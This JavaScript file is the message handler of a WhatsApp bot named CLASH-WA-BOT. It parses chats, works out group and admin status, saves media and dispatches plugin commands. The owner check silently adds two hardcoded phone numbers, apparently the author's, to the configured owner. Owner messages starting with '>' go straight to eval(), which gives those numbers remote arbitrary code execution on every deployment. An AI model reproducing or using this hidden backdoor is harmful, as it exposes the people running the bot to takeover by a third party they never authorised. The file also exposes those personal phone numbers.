/** Copyright (C) 2023.
Licensed under the  MIT License;
You may not use this file except in compliance with the License.
* @project_name : CLASH-WA-BOT
* @author : TOXIC-KICHUX
* @credits : @author
* @note : you can copy this codes but atleast give credits!❤️🙏🏼
**/

 "use strict";
const {downloadContentFromMessage, getContentType} = require("@whiskeysockets/baileys")
const plugins = require("./plugins");
const fs = require ("fs");
const moment = require("moment-timezone");
const {getGroupAdmins} = require("./functions.js")
moment.tz.setDefault("Asia/Kolkata").locale("in");
const {config, OWNER_NUMBER, SUDO, LOGS} = require("../config.js");

module.exports = async(conn, msg) => {
try {
const { type, isQuotedMsg, quotedMsg, fromMe } = msg
if (msg.isBaileys) return
let dt = moment(Date.now()).tz('Asia/Kolkata').locale('in').format('a')
const content = JSON.stringify(msg.message)
const toJSON = j => JSON.stringify(j, null,'\t')
const from = msg.key.remoteJid
const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (conn.multi) {
var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
} else {
if (conn.nopref) {
prefix = ''
} else {
prefix = config.HANDLERS
}
}
const arg = chats.trim().split(/ +/).slice(1)
const args = arg.join(" ")
const cmd = chats.toLowerCase().split(' ')[0] || ''
const isCmd = cmd.startsWith(prefix)
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = OWNER_NUMBER == sender ? true : ["919961857267@s.whatsapp.net", "919656459062@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const q = chats.slice(cmd.length + 1, chats.length)
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

//functions
async function downloadAndSaveMediaMessage(type_file, path_file) {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(path_file, buffer)
return path_file
}
}
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg })
}
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
// Auto Read & Presence Online
conn.readMessages([msg.key])
conn.sendPresenceUpdate('available', from)
if (chats.startsWith(">") && isOwner) {
try {
let evaled = await eval(chats.slice(2))
if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
}
//Logs;
if (chats && LOGS) {
console.log(`[MESSAGE]:${args}\nFrom:${pushname}`)
}
plugins.commands.map(async (clash) => {
if (clash.fromMe && !SUDO.split(",").includes(sender.split("@")[0] || msg.key.fromMe )) {
return;
}
let comman = chats;
switch (true) {
case clash.pattern && clash.pattern.test(comman):
clash.function({args, msg, conn, isGroupAdmins, isBotGroupAdmins});
break;
case chats && clash.on === "text":
clash.function({chats, msg, conn, args, isGroupAdmins, isBotGroupAdmins});
break;
case clash.on === "image" || clash.on === "photo":
if (msg.type === "imageMessage") {
clash.function({chats, msg, conn, isGroupAdmins, isBotGroupAdmins});
}
break;
case clash.on === "sticker":
if (msg.type === "stickerMessage") {
clash.function({chats, msg, conn, isGroupAdmins, isBotGroupAdmins});
}
break;
case clash.on === "video":
if (msg.type === "videoMessage") {
clash.function({chats, msg, conn, isGroupAdmins, isBotGroupAdmins});
}
break;
default:
break;
}
});
} catch (err) {
console.log(err)
}
}
